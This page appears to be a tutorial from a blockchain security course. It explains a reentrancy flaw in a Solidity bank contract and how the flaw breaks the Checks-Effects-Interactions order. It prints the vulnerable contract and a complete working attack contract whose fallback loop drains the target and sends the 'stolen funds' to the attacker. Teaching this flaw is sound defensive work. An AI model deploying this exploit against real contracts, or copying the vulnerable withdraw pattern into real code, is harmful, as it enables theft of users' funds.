<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Example: Attack to a Vulnerable code</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Example: Attack to a Vulnerable code</h1><br /><br />Vulnerable code: <a
      href="https://github.com/cclabsInc/BlockChainExploitation/blob/master/2020_BlockchainFreeCourse/reentrancy/simpleReentrancy.sol" target="_blank">https://github.com/cclabsInc/BlockChainExploitation/blob/master/2020_BlockchainFreeCourse/reentrancy/simpleReentrancy.sol</a><br />
    <div class="codebox">
      <div class="codebox">pragma&nbsp;solidity&nbsp;^0.6.6;<br /><br />contract&nbsp;simpleReentrancy&nbsp;<span
          style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;mapping&nbsp;(address&nbsp;=&gt;&nbsp;uint)&nbsp;private&nbsp;balances;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;deposit()&nbsp;public&nbsp;payable&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;require((balances[msg.sender]&nbsp;+&nbsp;msg.value)&nbsp;&gt;=&nbsp;balances[msg.sender]);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[msg.sender]&nbsp;+=&nbsp;msg.value;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;withdraw(uint&nbsp;withdrawAmount)&nbsp;public&nbsp;returns&nbsp;(uint)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Checks&nbsp;that&nbsp;you&nbsp;are&nbsp;only&nbsp;withdrawing&nbsp;the&nbsp;amount&nbsp;you&nbsp;have&nbsp;in&nbsp;your&nbsp;account&nbsp;or&nbsp;sends&nbsp;back&nbsp;an&nbsp;error<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;require(withdrawAmount&nbsp;&lt;=&nbsp;balances[msg.sender]);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Sends&nbsp;your&nbsp;requested&nbsp;amount&nbsp;to&nbsp;the&nbsp;address&nbsp;the&nbsp;requested&nbsp;a&nbsp;withdrawal<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg.sender.call.value(withdrawAmount)(&quot;&quot;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&lt;--&nbsp;PROBLEM<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Deducts&nbsp;the&nbsp;amount&nbsp;withdrawn&nbsp;from&nbsp;the&nbsp;accounts&nbsp;total&nbsp;balance<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[msg.sender]&nbsp;-=&nbsp;withdrawAmount;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&lt;--&nbsp;PROBLEM<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;balances[msg.sender];<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;getBalance()&nbsp;public&nbsp;view&nbsp;returns&nbsp;(uint){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;balances[msg.sender];<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><span
          style="color:#000000;font-weight:400">}</span></div>
    </div><br />This function is following a: <br /> ◇ Checks → Interaction → Effects<br />which violates the:<br /> ◇
    Checks → Effects → Interactions <br /><br />Because we interact with an external entity prior to updating the
    effects, the target contract is at risk for a call by a malicious contract that executes a loop with a malicious
    purpose.<br /><br /><strong>
      <h3>Attack code Contract example</h3>
    </strong>(<a
      href="https://github.com/cclabsInc/BlockChainExploitation/blob/master/2020_BlockchainFreeCourse/reentrancy/simpleReentrancyAttack.sol" target="_blank">github
      code</a>)<br />The main attack code in this contract is found on lines 32-38. This code creates a looping
    condition into the other contract by using a <strong>fallback function</strong>.<br />
    <div class="codebox">
      <div class="codebox">
        //creates&nbsp;an&nbsp;interface&nbsp;into&nbsp;the&nbsp;target&nbsp;contract&nbsp;via&nbsp;its&nbsp;function&nbsp;definitions<br />interface&nbsp;targetInterface{<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;deposit()&nbsp;external&nbsp;payable;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;withdraw(uint&nbsp;withdrawAmount)&nbsp;external;&nbsp;<br />}<br /><br />contract&nbsp;simpleReentrancyAttack<span
          style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;//interface&nbsp;is&nbsp;set&nbsp;to&nbsp;the&nbsp;address&nbsp;of&nbsp;the&nbsp;target&nbsp;contract<br />&nbsp;&nbsp;&nbsp;&nbsp;targetInterface&nbsp;bankAddress&nbsp;=&nbsp;targetInterface(0xd9145CCE52D386f254917e481eB44e9943F39138);&nbsp;//address&nbsp;of&nbsp;the&nbsp;deployed&nbsp;target&nbsp;contract<br />&nbsp;&nbsp;&nbsp;&nbsp;uint&nbsp;amount&nbsp;=&nbsp;1&nbsp;ether;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;deposit()&nbsp;public&nbsp;payable{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bankAddress.deposit.value(amount)();<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;getTargetBalance()&nbsp;public&nbsp;view&nbsp;returns(uint){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;address(bankAddress).balance;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;attack()&nbsp;public&nbsp;payable{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bankAddress.withdraw(amount);&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//after&nbsp;the&nbsp;attack&nbsp;we&nbsp;will&nbsp;take&nbsp;the&nbsp;balance&nbsp;of&nbsp;“this”&nbsp;contract&nbsp;and&nbsp;transfers&nbsp;it&nbsp;to&nbsp;our&nbsp;personal&nbsp;address<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;retrieveStolenFunds()&nbsp;public&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg.sender.transfer(address(this).balance);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//This&nbsp;second&nbsp;function&nbsp;is&nbsp;something&nbsp;called&nbsp;a&nbsp;fallback&nbsp;function.<br />&nbsp;&nbsp;&nbsp;&nbsp;//This&nbsp;function&nbsp;is&nbsp;used&nbsp;to&nbsp;accept&nbsp;payments&nbsp;that&nbsp;come&nbsp;into&nbsp;the&nbsp;contract&nbsp;when&nbsp;no&nbsp;function&nbsp;is&nbsp;specified.&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//You&nbsp;will&nbsp;notice&nbsp;this&nbsp;function&nbsp;does&nbsp;not&nbsp;have&nbsp;a&nbsp;name&nbsp;but&nbsp;is&nbsp;set&nbsp;to&nbsp;payable.<br />&nbsp;&nbsp;&nbsp;&nbsp;fallback&nbsp;()&nbsp;external&nbsp;payable{&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//checking&nbsp;that&nbsp;the&nbsp;target&nbsp;accounts&nbsp;balance&nbsp;is&nbsp;greater&nbsp;than&nbsp;the&nbsp;amount&nbsp;being&nbsp;withdrawn<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(address(bankAddress).balance&nbsp;&gt;=&nbsp;amount){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//calling&nbsp;the&nbsp;withdraw&nbsp;function&nbsp;to&nbsp;continue&nbsp;the&nbsp;loop&nbsp;which&nbsp;will&nbsp;in&nbsp;turn&nbsp;be&nbsp;sent&nbsp;back&nbsp;to&nbsp;the&nbsp;fallback&nbsp;function<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//and&nbsp;repeat&nbsp;lines&nbsp;over&nbsp;and&nbsp;over&nbsp;until&nbsp;the&nbsp;target&nbsp;contracts&nbsp;balance&nbsp;is&nbsp;less&nbsp;than&nbsp;the&nbsp;amount&nbsp;being&nbsp;requested.<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bankAddress.withdraw(amount);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><span
          style="color:#000000;font-weight:400">}</span></div>
    </div><br /> <a href=""><img src="images/1391-1.png" alt="images/1391-1.png" /></a><br /> 1) The attack() function
    calls into the withdraw function of the vulnerable contract<br /> 2) Then the fallback function is entered from the
    withdrawal transaction <br /> 3) fallback function returns right back to the beginning of the withdraw function into
    the contract.<br /> This forms the loop between withdraw and fallback until the contract is below 1
    ether.<br /><br /><strong>Interface</strong><br />With an interface set<br />
    <div class="codebox">
      <div class="codebox">
        interface&nbsp;targetInterface{<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;deposit()&nbsp;external&nbsp;payable;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;withdraw(uint&nbsp;withdrawAmount)&nbsp;external;&nbsp;<br />}<br /><br />targetInterface&nbsp;bankAddress&nbsp;=&nbsp;targetInterface(ADD_TARGET_ADDRESS);
      </div>
    </div><br />we can call the functions directly with the bankAddress interface using the function name as seen in the
    deposit function and attack function to call deposit and withdraw.<br />
    <div class="codebox">
      <div class="codebox">
        bankAddress.deposit.value(amount)()&nbsp;&nbsp;//deposit<br />bankAddress.withdraw(amount)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//withdraw
      </div>
    </div><br /><br /><br />
  </div>
</body>

</html>